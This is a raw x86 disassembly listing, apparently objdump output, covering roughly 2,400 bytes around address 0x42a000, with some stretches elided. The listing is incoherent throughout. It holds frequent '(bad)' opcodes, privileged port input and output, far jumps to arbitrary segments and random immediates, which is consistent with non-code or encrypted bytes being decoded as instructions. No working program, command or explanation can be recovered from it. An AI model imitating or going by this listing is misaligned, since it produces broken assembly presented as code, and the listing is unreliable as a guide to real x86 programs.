  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	cmp    eax,0x8c492a08
  42a105:	rol    DWORD PTR [ecx],0x0
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	es mov bl,0x0
  42a10f:	pop    edi
  42a110:	jae    0x42a0c2
  42a112:	xor    DWORD PTR [ebp-0x496fbae5],0xffffffc4
  42a119:	mov    dl,0x61
  42a11b:	add    eax,ecx
  42a11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a11e:	test   al,0x8e
  42a120:	add    DWORD PTR [ebx-0x7e],esp
  42a123:	in     eax,0xf2
  42a125:	out    0x82,al
  42a127:	ins    BYTE PTR es:[edi],dx
  42a128:	in     al,0xbb
  42a12a:	xchg   DWORD PTR [esi+0x2a6bfe6d],ecx
  42a130:	adc    DWORD PTR [ecx+0x27],edx
  42a133:	push   esi
  42a134:	mov    edi,0x7c6dd24b
  42a139:	cwde   
  42a13a:	push   esp
  42a13b:	imul   ebp,DWORD PTR [eax+0x4a],0x32bdeaac
  42a142:	mov    eax,0x9e5816ee
  42a147:	rol    DWORD PTR [ebx+0x45b47727],1
  42a14d:	mov    bl,BYTE PTR [ebx-0xe]
  42a150:	sbb    edi,DWORD PTR [ebx-0x56]
  42a153:	cld    
  42a154:	int    0x1
  42a156:	icebp  
  42a157:	mov    ah,0x0
  42a159:	mov    ecx,0x9ea21448
  42a15e:	outs   dx,DWORD PTR ds:[esi]
  42a15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a160:	mov    ah,BYTE PTR [edi-0x5e3b7629]
  42a166:	gs adc al,0xe0
  42a169:	sub    edx,ecx
  42a16b:	xchg   ebp,eax
  42a16c:	into   
  42a16d:	pop    ebx
  42a16e:	outs   dx,DWORD PTR ds:[esi]
  42a16f:	jg     0x42a140
  42a171:	xchg   esp,eax
  42a172:	xlat   BYTE PTR ds:[ebx]
  42a173:	pusha  
  42a174:	retf   0x23d9
  42a177:	xchg   ebx,eax
  42a178:	in     eax,dx
  42a179:	sbb    al,0xfe
  42a17b:	ret    
  42a17c:	push   ss
  42a17d:	loop   0x42a1ce
  42a17f:	lea    esi,[ebp-0x35]
  42a182:	sbb    ecx,edx
  42a184:	xchg   esp,eax
  42a185:	aam    0xef
  42a187:	mov    esp,ebp
  42a189:	into   
  42a18a:	sbb    DWORD PTR [ecx],ebx
  42a18c:	hlt    
  42a18d:	jno    0x42a1b6
  42a18f:	xchg   edx,eax
  42a190:	sbb    ebp,DWORD PTR [ecx+0x3a9b9793]
  42a196:	das    
  42a197:	cmp    bl,bh
  42a199:	mov    edx,0xdc89d46b
  42a19e:	mov    ebx,0xaa3ba5c2
  42a1a3:	stos   DWORD PTR es:[edi],eax
  42a1a4:	push   edi
  42a1a5:	mov    esi,0xf84fb5e7
  42a1aa:	sub    DWORD PTR [ecx],0x3e
  42a1ad:	sti    
  42a1ae:	dec    edx
  42a1af:	xor    al,BYTE PTR [ecx-0x41339e8e]
  42a1b5:	out    dx,eax
  42a1b6:	jb     0x42a1dd
  42a1b8:	vcmppd ymm0,ymm7,YMMWORD PTR [ecx],0x30
  42a1bd:	or     eax,0xdbb92ab0
  42a1c2:	lea    esi,[ebp-0x44]
  42a1c5:	lods   al,BYTE PTR ds:[esi]
  42a1c6:	mov    edi,0x34caf041
  42a1cb:	inc    ebx
  42a1cc:	dec    ebx
  42a1cd:	lds    ebx,FWORD PTR [edx-0x6793c4d0]
  42a1d3:	mov    ebp,0xb3ef1d21
  42a1d8:	jno    0x42a19b
  42a1da:	push   edi
  42a1db:	cmp    dh,0xfb
  42a1de:	pushf  
  42a1df:	lea    esi,[ecx+0x62]
  42a1e2:	cmp    BYTE PTR [edi-0x2041e87f],ch
  42a1e8:	int    0x1d
  42a1ea:	cwde   
  42a1eb:	aaa    
  42a1ec:	(bad)
  42a1ef:	fidivr WORD PTR [ebx]
  42a1f1:	jl     0x42a269
  42a1f3:	mov    BYTE PTR [esi-0x73],0x62
  42a1f7:	je     0x42a23d
  42a1f9:	ins    DWORD PTR es:[edi],dx
  42a1fa:	fist   WORD PTR [esi-0x704066d5]
  42a200:	xchg   edi,eax
  42a201:	inc    eax
  42a202:	addr16 xchg ebx,eax
  42a204:	sbb    ch,BYTE PTR [edx-0x447e892c]
  42a20a:	call   0x18:0xd47932cd
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fnstenv [ecx-0x5e]
  42a282:	or     al,0x48
  42a284:	nop
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	adc    edx,DWORD PTR [edx+0x56286f01]
  42a292:	shl    BYTE PTR [ebx],0x39
  42a295:	mov    WORD PTR [ebp-0x107e8c0b],ds
  42a29b:	sbb    DWORD PTR [esi-0x72],0x6c51cf30
  42a2a2:	pop    edx
  42a2a3:	(bad)  
  42a2a4:	dec    ebx
  42a2a5:	lds    edx,FWORD PTR [esi+edx*4+0x32935f5]
  42a2ac:	aas    
  42a2ad:	(bad)  
  42a2ae:	out    0x33,al
  42a2b0:	jno    0x42a29e
  42a2b2:	adc    ebp,DWORD PTR [eax+0x76b1ca1e]
  42a2b8:	mov    DWORD PTR [esi-0x2d97169d],ebp
  42a2be:	add    esp,DWORD PTR [esi]
  42a2c0:	inc    edi
  42a2c1:	cmp    BYTE PTR [edx+ecx*4],bl
  42a2c4:	jmp    0x62e2:0x4f191a77
  42a2cb:	in     al,0x44
  42a2cd:	mov    ah,0x6f
  42a2cf:	mov    edi,DWORD PTR [edi-0x36]
  42a2d2:	std    
  42a2d3:	not    DWORD PTR [esp+edi*8-0x12]
  42a2d7:	mov    ebx,0x97edbd04
  42a2dc:	inc    esi
  42a2dd:	sub    DWORD PTR [ecx],0x5178e8c8
  42a2e3:	inc    edi
  42a2e4:	adc    al,0xc8
  42a2e6:	loopne 0x42a331
  42a2e8:	retf   
  42a2e9:	xchg   esi,eax
  42a2ea:	mov    ah,0x1b
  42a2ec:	mov    edi,0x33d54487
  42a2f1:	cs xchg ecx,eax
  42a2f3:	pop    ds
  42a2f4:	lods   eax,DWORD PTR ds:[esi]
  42a2f5:	jmp    0x2530:0x8f50e37b
  42a2fc:	test   BYTE PTR [eax-0x5f],dh
  42a2ff:	fidiv  WORD PTR [eax+0x1]
  42a302:	jl     0x42a340
  42a304:	stos   BYTE PTR es:[edi],al
  42a305:	sbb    al,0xe8
  42a307:	jnp    0x42a311
  42a309:	adc    DWORD PTR [ecx-0x4f8055],ebx
  42a30f:	sbb    eax,0xa46d2945
  42a314:	add    BYTE PTR [ecx-0x33cdfd76],0x11
  42a31b:	shr    DWORD PTR [edx+0x53141c6],1
  42a321:	xchg   ecx,eax
  42a322:	adc    edi,edx
  42a324:	and    DWORD PTR [ebx-0x72],eax
  42a327:	dec    ebx
  42a328:	jne    0x42a2f0
  42a32a:	imul   ecx,DWORD PTR [edi-0x6894e717],0xbad04af5
  42a334:	add    BYTE PTR [edx-0x4],ah
  42a337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a338:	pop    es
  42a339:	push   edi
  42a33a:	(bad)  
  42a33b:	xchg   ebp,eax
  42a33c:	retf   0x1400
  42a33f:	outs   dx,BYTE PTR fs:[esi]
  42a341:	jno    0x42a351
  42a343:	loop   0x42a396
  42a345:	sub    dh,BYTE PTR [ebp-0x11]
  42a348:	mov    bl,0x4
  42a34a:	or     eax,0x5bd2166f
  42a34f:	or     ebx,0x9484dd7
  42a355:	out    dx,eax
  42a356:	clc    
  42a357:	leave  
  42a358:	shl    bh,cl
  42a35a:	or     BYTE PTR [esi],dl
  42a35c:	scas   al,BYTE PTR es:[edi]
  42a35d:	or     BYTE PTR [edx-0x13df8d09],cl
  42a363:	push   ss
  42a364:	jge    0x42a374
  42a366:	pop    ecx
  42a367:	shr    eax,cl
  42a369:	leave  
  42a36a:	repnz das 
  42a36c:	or     ebx,0x95c86dc9
  42a372:	ficomp WORD PTR [ebx]
  42a374:	mov    al,0xb
  42a376:	or     esp,DWORD PTR [eax]
  42a378:	pop    ebx
  42a379:	std    
  42a37a:	and    bh,dh
  42a37c:	cmp    BYTE PTR [ebx+0x720b51f6],ch
  42a382:	pop    esi
  42a383:	sub    eax,0x4c3074c7
  42a388:	(bad)  
  42a389:	jo     0x42a34b
  42a38b:	imul   ecx,DWORD PTR [eax+0x7650f8],0x0
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x1e77163d
  42a403:	jno    0x42a399
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	mov    edx,DWORD PTR [eax]
  42a40e:	xchg   DWORD PTR [ebx-0x56b0af5d],ebx
  42a414:	pop    es
  42a415:	test   DWORD PTR [ecx],eax
  42a417:	dec    ecx
  42a418:	outs   dx,DWORD PTR ds:[esi]
  42a419:	(bad)  
  42a41a:	popf   
  42a41b:	mov    DWORD PTR [ecx+edi*2+0x4f22da81],edi
  42a422:	std    
  42a423:	imul   esi,DWORD PTR ds:0x4e474cfd,0xffffff8f
  42a42a:	cwde   
  42a42b:	push   esp
  42a42c:	addr16 retf 
  42a42e:	ret    
  42a42f:	pop    ss
  42a430:	pop    ebx
  42a431:	jmp    FWORD PTR [edx+0x12ce7cf0]
  42a437:	lahf   
  42a438:	loope  0x42a3ba
  42a43a:	sbb    bh,BYTE PTR [ecx+eiz*8]
  42a43d:	mov    ebx,0x5b321435
  42a442:	inc    ecx
  42a443:	cmc    
  42a444:	xchg   edx,eax
  42a445:	jae    0x42a3ec
  42a447:	ins    DWORD PTR es:[edi],dx
  42a448:	stos   BYTE PTR es:[edi],al
  42a449:	nop
  42a44a:	push   esi
  42a44b:	(bad)  [ebx]
  42a44d:	sub    cl,al
  42a44f:	ds leave 
  42a451:	add    ch,BYTE PTR [ebp-0x3a]
  42a454:	add    DWORD PTR [edi+edi*4+0x45887136],edi
  42a45b:	fcmovu st,st(3)
  42a45d:	ret    
  42a45e:	jne    0x42a414
  42a460:	scas   al,BYTE PTR es:[edi]
  42a461:	mul    BYTE PTR [ecx+0x53]
  42a464:	shl    DWORD PTR [esi+0x24],1
  42a467:	inc    eax
  42a468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a469:	retf   
  42a46a:	mov    al,ah
  42a46c:	pop    esi
  42a46d:	test   BYTE PTR ds:0x8afd0198,0x1b
  42a474:	push   ebp
  42a475:	sub    ah,al
  42a477:	stc    
  42a478:	int3   
  42a479:	and    DWORD PTR [edi+0x5aba4dd0],0x9f7a5d36
  42a483:	inc    ebx
  42a484:	add    dh,BYTE PTR [eax+0x655d6664]
  42a48a:	xchg   esp,eax
  42a48b:	dec    ebp
  42a48c:	sbb    bl,BYTE PTR [edx-0x28]
  42a48f:	xchg   ebp,eax
  42a490:	call   0x56bd:0x19c1cfbf
  42a497:	mov    ecx,0x4309f41d
  42a49c:	sbb    DWORD PTR [ebp+edi*2+0x10],ebx
  42a4a0:	ds push ecx
  42a4a2:	jae    0x42a50f
  42a4a4:	mov    eax,ds:0x259a0771
  42a4a9:	add    al,0xd0
  42a4ab:	ins    DWORD PTR es:[edi],dx
  42a4ac:	jmp    0xf1eb7ca7
  42a4b1:	fcmovnb st,st(2)
  42a4b3:	cli    
  42a4b4:	xchg   ecx,eax
  42a4b5:	das    
  42a4b6:	shl    bl,0xf9
  42a4b9:	aas    
  42a4ba:	cs push ds
  42a4bc:	enter  0xbb2d,0x48
  42a4c0:	mov    ds:0x4f70bda3,eax
  42a4c5:	arpl   WORD PTR [ebx],dx
  42a4c7:	sbb    BYTE PTR [edx],ah
  42a4c9:	call   DWORD PTR [ebx+edx*4-0x2bc709a4]
  42a4d0:	jge    0x42a52a
  42a4d2:	pushf  
  42a4d3:	add    esp,ecx
  42a4d5:	ins    BYTE PTR es:[edi],dx
  42a4d6:	jbe    0x42a546
  42a4d8:	retf   0x5e23
  42a4db:	inc    edi
  42a4dc:	jg     0x42a469
  42a4de:	mov    esp,0xd35117b2
  42a4e3:	push   esi
  42a4e4:	jo     0x42a50c
  42a4e6:	std    
  42a4e7:	or     BYTE PTR ds:0x3895d251,cl
  42a4ed:	outs   dx,BYTE PTR ds:[esi]
  42a4ee:	push   es
  42a4ef:	push   es
  42a4f0:	lods   eax,DWORD PTR ds:[esi]
  42a4f1:	lods   eax,DWORD PTR ds:[esi]
  42a4f2:	add    al,0x42
  42a4f4:	inc    eax
  42a4f5:	push   ecx
  42a4f6:	ja     0x42a557
  42a4f8:	clc    
  42a4f9:	scas   eax,DWORD PTR es:[edi]
  42a4fa:	call   0x6429:0x4565f275
  42a501:	mov    ecx,edx
  42a503:	or     al,0xae
  42a505:	lock xor esi,DWORD PTR [ecx]
  42a508:	mov    dl,0xc5
  42a50a:	push   edx
  42a50b:	add    eax,0xfd4db7cd
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x64f7a79f
  42a583:	push   ss
  42a584:	cwde   
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	popa   
  42a58d:	jg     0x42a541
  42a58f:	fsub   DWORD PTR [eax+0xdc2fb60]
  42a595:	sti    
  42a596:	inc    ebx
  42a597:	and    esp,DWORD PTR [ebp+0x2040355e]
  42a59d:	mov    dl,0x81
  42a59f:	pushf  
  42a5a0:	in     al,dx
  42a5a1:	fisub  DWORD PTR [ebp+0x67c6de31]
  42a5a7:	in     al,dx
  42a5a8:	fsub   DWORD PTR [edi-0x5a5d27de]
  42a5ae:	loope  0x42a5a2
  42a5b0:	pop    ds
  42a5b1:	mov    bh,0x95
  42a5b3:	xchg   edx,eax
  42a5b4:	and    dl,BYTE PTR [edi]
  42a5b6:	loop   0x42a5bf
  42a5b8:	dec    edx
  42a5b9:	(bad)  
  42a5ba:	ror    ah,cl
  42a5bc:	int    0xfe
  42a5be:	mov    dh,0xd9
  42a5c0:	dec    eax
  42a5c1:	rol    BYTE PTR [esi-0x29091393],cl
  42a5c7:	or     DWORD PTR [ecx-0x5cf6a18e],ecx
  42a5cd:	sbb    edi,ebx
  42a5cf:	sti    
  42a5d0:	and    al,0xf5
  42a5d2:	mov    ebp,0x85852193
  42a5d7:	dec    esi
  42a5d8:	push   ss
  42a5d9:	mov    ah,0x5f
  42a5db:	cmp    eax,edx
  42a5dd:	sbb    al,0xbb
  42a5df:	push   edi
  42a5e0:	xor    cl,al
  42a5e2:	bound  esi,QWORD PTR [eax-0x2e]
  42a5e5:	outs   dx,BYTE PTR ds:[esi]
  42a5e6:	or     BYTE PTR ds:[eax+0x24],bl
  42a5ea:	inc    esp
  42a5eb:	lahf   
  42a5ec:	pop    ds
  42a5ed:	and    esp,ecx
  42a5ef:	ror    ebx,1
  42a5f1:	pop    edx
  42a5f2:	cmp    cl,BYTE PTR [edi]
  42a5f4:	scas   al,BYTE PTR es:[edi]
  42a5f5:	in     eax,dx
  42a5f6:	jnp    0x42a667
  42a5f8:	stc    
  42a5f9:	pop    ebx
  42a5fa:	cmp    dh,BYTE PTR [esi-0x6f2deec5]
  42a600:	fyl2xp1 
  42a602:	add    esp,DWORD PTR [edx-0x4a]
  42a605:	mov    edx,edi
  42a607:	repnz push ebx
  42a609:	cmp    eax,0x1c632475
  42a60e:	lea    ecx,[ecx-0x46]
  42a611:	push   es
  42a612:	jmp    0x839d:0xf15b5831
  42a619:	push   ecx
  42a61a:	daa    
  42a61b:	bound  eax,QWORD PTR [edx-0x2cc8413a]
  42a621:	nop
  42a622:	shl    BYTE PTR [edx],1
  42a624:	enter  0xa911,0xf3
  42a628:	(bad)
  42a62b:	xor    BYTE PTR [ebp-0x23492428],al
  42a631:	inc    ebx
  42a632:	les    ebx,FWORD PTR [esi-0x39]
  42a635:	test   al,0xa3
  42a637:	lods   eax,DWORD PTR ds:[esi]
  42a638:	xchg   edx,eax
  42a639:	test   eax,0x1a4b237
  42a63e:	scas   eax,DWORD PTR es:[edi]
  42a63f:	iret   
  42a640:	or     eax,edi
  42a642:	dec    esp
  42a643:	or     eax,0x5723eac2
  42a648:	idiv   ah
  42a64a:	jns    0x42a64f
  42a64c:	pushf  
  42a64d:	gs sbb al,0x1f
  42a650:	test   al,0xe0
  42a652:	popa   
  42a653:	pop    ebx
  42a654:	adc    al,0xf6
  42a656:	daa    
  42a657:	fst    QWORD PTR [edx-0x29]
  42a65a:	stos   BYTE PTR es:[edi],al
  42a65b:	sub    al,0x55
  42a65d:	mov    edi,0x3b39b5be
  42a662:	mov    ds:0x15da11e0,eax
  42a667:	loope  0x42a647
  42a669:	dec    ecx
  42a66a:	retf   0x496d
  42a66d:	scas   eax,DWORD PTR es:[edi]
  42a66e:	and    al,0x96
  42a670:	xlat   BYTE PTR ds:[ebx]
  42a671:	pop    esi
  42a672:	pop    edi
  42a673:	and    bl,BYTE PTR [ecx+0x34]
  42a676:	sbb    bh,BYTE PTR [edx-0x11d85a80]
  42a67c:	pop    ss
  42a67d:	cmp    BYTE PTR [edx-0x7438a1e6],ch
  42a683:	sbb    al,0x8a
  42a685:	call   FWORD PTR [edi]
  42a687:	test   DWORD PTR ds:0xb5038830,ecx
  42a68d:	mov    esi,0x3bac
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x1347ece4],0x9cf60c76
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	or     esp,ebx
  42a70e:	aas    
  42a70f:	fist   DWORD PTR [edx]
  42a711:	pop    ds
  42a712:	sti    
  42a713:	cmp    eax,DWORD PTR [edi-0x78]
  42a716:	cmp    BYTE PTR [esi+0x33],0x88
  42a71a:	mov    al,ds:0x70975600
  42a71f:	xor    cl,cl
  42a721:	mov    dh,0x22
  42a723:	dec    edx
  42a724:	and    BYTE PTR [eax],dh
  42a726:	cld    
  42a727:	adc    al,0x83
  42a729:	xor    al,dh
  42a72b:	pop    ebx
  42a72c:	leave  
  42a72d:	test   BYTE PTR [edx],ah
  42a72f:	ffreep st(6)
  42a731:	push   es
  42a732:	push   eax
  42a733:	ror    BYTE PTR [ebx+0x1c44c654],cl
  42a739:	mov    dl,0x5e
  42a73b:	xor    BYTE PTR [edx-0x2caaa5de],0xc4
  42a742:	pop    es
  42a743:	pop    eax
  42a744:	cld    
  42a745:	loopne 0x42a74f
  42a747:	mov    ecx,0xbeaddec2
  42a74c:	scas   al,BYTE PTR es:[edi]
  42a74d:	mov    esp,0xde407e05
  42a752:	neg    DWORD PTR [esi]
  42a754:	cs fs call 0x51b4:0xae1e551
  42a75d:	cli    
  42a75e:	inc    ebp
  42a75f:	push   ecx
  42a760:	adc    eax,0x31f0252d
  42a765:	and    ch,bl
  42a767:	dec    ebx
  42a768:	dec    eax
  42a769:	jb     0x42a789
  42a76b:	dec    edx
  42a76c:	sbb    ecx,esp
  42a76e:	cmc    
  42a76f:	daa    
  42a770:	jg     0x42a72d
  42a772:	fidiv  DWORD PTR [ebx-0xd]
  42a775:	sub    al,0x28
  42a777:	das    
  42a778:	mov    ds:0x1229f1b9,al
  42a77d:	xlat   BYTE PTR ds:[ebx]
  42a77e:	push   0x23
  42a780:	xor    DWORD PTR [ebx-0x29],esp
  42a783:	ss push ds
  42a785:	pop    eax
  42a786:	das    
  42a787:	push   ebp
  42a788:	cmp    BYTE PTR [esi-0x46bff7db],al
  42a78e:	mov    bh,0x2d
  42a790:	hlt    
  42a791:	retf   0x815a
  42a794:	mov    eax,0x806d675d
  42a799:	xchg   DWORD PTR [edi-0x1aed1559],ebp
  42a79f:	cmp    DWORD PTR [ebx+0x749c2d58],eax
  42a7a5:	dec    esi
  42a7a6:	pop    eax
  42a7a7:	push   0xeaafb61d
  42a7ac:	xlat   BYTE PTR ds:[ebx]
  42a7ad:	leave  
  42a7ae:	inc    edx
  42a7af:	dec    ebx
  42a7b0:	outs   dx,DWORD PTR ds:[esi]
  42a7b1:	mov    edx,0x1fbfbfdd
  42a7b6:	mov    ebx,0x880e4e9
  42a7bb:	fdiv   st,st(0)
  42a7bd:	xchg   esi,eax
  42a7be:	mov    ds:0x7942a22f,eax
  42a7c3:	out    0xe5,eax
  42a7c5:	lock stos BYTE PTR es:[edi],al
  42a7c7:	in     al,dx
  42a7c8:	sub    ah,0xe2
  42a7cb:	push   0x47
  42a7cd:	std    
  42a7ce:	mov    WORD PTR [ebx-0x4102e443],ds
  42a7d4:	mov    dl,0x2
  42a7d6:	inc    edx
  42a7d7:	call   0xdf796952
  42a7dc:	jle    0x42a7b9
  42a7de:	adc    edx,DWORD PTR [esi]
  42a7e0:	xor    ecx,ebp
  42a7e2:	ret    0xa56
  42a7e5:	(bad)
  42a7e8:	or     dh,cl
  42a7ea:	mov    ds:0x6260e4f3,al
  42a7ef:	dec    eax
  42a7f0:	(bad)  
  42a7f1:	icebp  
  42a7f2:	stos   DWORD PTR es:[edi],eax
  42a7f3:	ja     0x42a7ee
  42a7f5:	pop    ss
  42a7f6:	arpl   WORD PTR [ecx-0x2],sp
  42a7f9:	inc    ecx
  42a7fa:	adc    al,0x19
  42a7fc:	and    ecx,DWORD PTR [ecx+0x27]
  42a7ff:	ja     0x42a7ad
  42a801:	sbb    al,0x75
  42a803:	and    eax,0x14b37a33
  42a808:	and    BYTE PTR [edi-0x4e],bh
  42a80b:	pusha  
  42a80c:	test   BYTE PTR [ecx-0x4],ah
  42a80f:	test   BYTE PTR [eax],al
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	xchg   edx,eax
  42a881:	cdq    
  42a882:	outs   dx,BYTE PTR ds:[esi]
  42a883:	jp     0x42a825
  42a885:	mov    BYTE PTR [ecx],0x0
  42a888:	add    al,0x1
  42a88a:	add    BYTE PTR [eax],al
  42a88c:	pop    esi
  42a88d:	adc    ebx,DWORD PTR [ecx+ecx*2+0x4b]
  42a891:	mov    dl,0x57
  42a893:	sti    
  42a894:	sahf   
  42a895:	int3   
  42a896:	aad    0x6b
  42a898:	dec    edx
  42a899:	inc    edx
  42a89a:	in     eax,dx
  42a89b:	or     ah,BYTE PTR [ebp+edi*2-0x7a]
  42a89f:	bound  esp,QWORD PTR [esi-0x764406c8]
  42a8a5:	adc    al,0xc1
  42a8a7:	mov    ebp,0xe7cb5da5
  42a8ac:	xchg   ebx,eax
  42a8ad:	lea    ebp,[edi-0x2c876767]
  42a8b3:	stos   DWORD PTR es:[edi],eax
  42a8b4:	outs   dx,BYTE PTR ds:[esi]
  42a8b5:	mov    ah,0x99
  42a8b7:	ss mov ah,0xed
  42a8ba:	ret    
  42a8bb:	pusha  
  42a8bc:	loopne 0x42a886
  42a8be:	mov    cl,0x84
  42a8c0:	sub    esi,DWORD PTR [ebx]
  42a8c2:	out    dx,eax
  42a8c3:	mov    ebp,0x97c46d55
  42a8c8:	aas    
  42a8c9:	out    0x6b,eax
  42a8cb:	ins    BYTE PTR es:[edi],dx
  42a8cc:	xchg   ecx,eax
  42a8cd:	out    dx,eax
  42a8ce:	adc    BYTE PTR [edi+0x7a07af09],ah
  42a8d4:	and    ch,BYTE PTR [eiz*1-0x1d33814a]
  42a8db:	dec    edx
  42a8dc:	loop   0x42a8ec
  42a8de:	lock cmp DWORD PTR [ebp+0x33],eax
  42a8e2:	hlt    
  42a8e3:	sub    BYTE PTR [edx],bh
  42a8e5:	or     ch,BYTE PTR [ecx+0x4a]
  42a8e8:	out    dx,al
  42a8e9:	xchg   ebp,eax
  42a8ea:	aaa    
  42a8eb:	add    al,0x21
  42a8ed:	mov    bl,0x60
  42a8ef:	jbe    0x42a96f
  42a8f1:	ins    BYTE PTR es:[edi],dx
  42a8f2:	in     eax,dx
  42a8f3:	lods   al,BYTE PTR ds:[esi]
  42a8f4:	iret   
  42a8f5:	mov    ds:0x415d9c6f,eax
  42a8fa:	mov    ebx,DWORD PTR [esi]
  42a8fc:	mov    ebx,eax
  42a8fe:	sub    eax,0x1241a8f2
  42a903:	jmp    0x42a885
  42a905:	imul   esi,DWORD PTR [ebx-0x40],0xf4d6ff5b
  42a90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a90d:	ret    
  42a90e:	adc    ecx,DWORD PTR [edx+0x2a]
  42a911:	stos   DWORD PTR es:[edi],eax
  42a912:	int    0x51
  42a914:	pop    edi
  42a915:	in     eax,dx
  42a916:	xchg   ebx,eax
  42a917:	add    DWORD PTR [edi],edi
  42a919:	cmp    DWORD PTR [ebx+0x537342bd],ebp
  42a91f:	push   cs
  42a920:	adc    bx,WORD PTR [esi-0x78797cbe]
  42a927:	cmp    DWORD PTR [esi+esi*8+0x75c6775d],edi
  42a92e:	das    
  42a92f:	or     al,0x1e
  42a931:	es std 
  42a933:	mov    ch,0x4e
  42a935:	shr    BYTE PTR [eax+ebp*2],cl
  42a938:	in     eax,0x89
  42a93a:	mov    ah,0x73
  42a93c:	stc    
  42a93d:	pop    esp
  42a93e:	test   eax,0x95d14848
  42a943:	repnz dec ebp
  42a945:	lds    ebp,FWORD PTR [ecx+0x27c0bfa]
  42a94b:	jl     0x42a9c5
  42a94d:	or     al,0xf3
  42a94f:	jmp    0x71966380
  42a954:	cmp    al,0xe6
  42a956:	add    esi,DWORD PTR [ebp+0x2e]
  42a959:	iret   
  42a95a:	xor    ebx,DWORD PTR [ecx-0x15ee3a27]
  42a960:	aas    
  42a961:	aam    0xcc
  42a963:	cmp    edx,ebx
  42a965:	loopne 0x42a928
  42a967:	mov    es,esp
  42a969:	int3   
  42a96a:	cmp    eax,0xe64b9a92
  42a96f:	push   es
  42a970:	rcl    eax,0x72
  42a973:	mov    ch,0x50
  42a975:	and    edx,ecx
  42a977:	pushf  
  42a978:	inc    eax
  42a979:	jno    0x42a9f0
  42a97b:	cli    
  42a97c:	ret    0xf885
  42a97f:	mov    ss,WORD PTR [edi]
  42a981:	xchg   esi,eax
  42a982:	push   ebp
  42a983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a984:	cmp    ah,ah
  42a986:	mov    ebp,0xc67c8aed
  42a98b:	mov    cl,0xad
  42a98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a98e:	int3   
  42a98f:	dec    edx
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	in     eax,dx
  42aa01:	fistp  QWORD PTR [ecx]
  42aa03:	mov    dl,0xa4
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR [esi],bl
  42aa0d:	pop    ss
  42aa0e:	loop   0x42aa40
  42aa10:	imul   esi,ecx,0xb2d369f5
  42aa16:	test   BYTE PTR ds:0xbe21de18,dh
  42aa1c:	push   0xdfaa61c2
  42aa21:	dec    ebx
  42aa22:	xchg   edx,eax
  42aa23:	mov    ds:0x4505206c,eax
  42aa28:	adc    al,0xd9
  42aa2a:	outs   dx,DWORD PTR ds:[esi]
  42aa2b:	adc    eax,0x7005a6f9
  42aa30:	push   edx
  42aa31:	xchg   BYTE PTR [edi-0x7872f0b],ah
  42aa37:	jmp    0xe3ff:0x2c4089d6
  42aa3e:	mov    al,0xa0
  42aa40:	adc    ebx,edi
  42aa42:	cld    
  42aa43:	xor    ecx,ecx
  42aa45:	sub    al,0x5
  42aa47:	in     eax,dx
  42aa48:	retf   
  42aa49:	test   al,0xf3
  42aa4b:	imul   esi,DWORD PTR [edi-0x3f],0xb
  42aa4f:	sub    ebx,DWORD PTR [ecx+ebp*8-0x69]
  42aa53:	aaa    
  42aa54:	jno    0x42aace
  42aa56:	sbb    DWORD PTR [edx-0x44047b82],ebx
  42aa5c:	mov    ah,0xa3
  42aa5e:	xor    eax,0xc91ce892
  42aa63:	or     ah,BYTE PTR [ecx-0x39]
  42aa66:	jae    0x42aa24
  42aa68:	popa   
  42aa69:	mov    BYTE PTR [esi-0x31520c9],dh
  42aa6f:	adc    ah,BYTE PTR [ecx-0x60093f51]
  42aa75:	jmp    FWORD PTR [ecx]
  42aa77:	inc    ebx
  42aa78:	mov    esi,0xd121ca0d
  42aa7d:	and    cl,BYTE PTR [ecx]
  42aa7f:	fs cmc 
  42aa81:	jb     0x42aa7d
  42aa83:	sti    
  42aa84:	push   edi
  42aa85:	inc    esi
  42aa86:	mov    WORD PTR [eax+0x173c46ad],es
  42aa8c:	les    edx,FWORD PTR [ebx]
  42aa8e:	out    dx,eax
